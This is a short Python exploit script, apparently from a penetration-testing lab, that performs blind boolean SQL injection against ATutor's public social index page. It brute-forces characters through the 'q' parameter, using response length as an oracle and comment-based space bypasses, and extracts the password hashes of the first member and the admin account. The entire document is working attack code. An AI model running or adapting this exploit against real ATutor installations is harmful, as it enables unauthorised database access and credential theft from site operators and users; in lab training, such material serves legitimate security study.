import requests
import sys

target_url = "http://192.168.218.103"
burp_proxy = {'http':'http://127.0.0.1:8080'}

BURP = True

def is_valid_character(query) -> str:
    # 32-126 is valid ascii characters.
    for character in range(32,126):
        current_url = f"{target_url}/ATutor/mods/_standard/social/index_public.php?q={query}%23".replace("FUZZ", str(character))

        # should we route our traffic via burp?
        if BURP:
            attempt = requests.get(current_url, proxies=burp_proxy)
        else:
            attempt = requests.get(current_url)

        if int(attempt.headers['Content-Length']) > 240:
            return character

def injection(query, length=41) -> str:
    extracted = ""

    for i in range(1, length):
        injection_string = f"liam1337')/**/or/**/(ascii(substring(({query}),{i},1)))=FUZZ"
        is_valid_attempt = is_valid_character(injection_string)

        if is_valid_attempt:
            extracted += chr(is_valid_attempt)
            extracted_character = chr(is_valid_attempt)

            sys.stdout.write(extracted_character)
            sys.stdout.flush()
    
    print("obtained hash")
    return extracted
def main():
    print("getting hash")
    # obtain the hash of teacher / root va
    print(injection('select/**/password/**/from/**/AT_members/**/where/**/member_id=1'))
    print(injection('select/**/password/**/from/**/AT_admins/**/where/**/login="admin"'))


main()

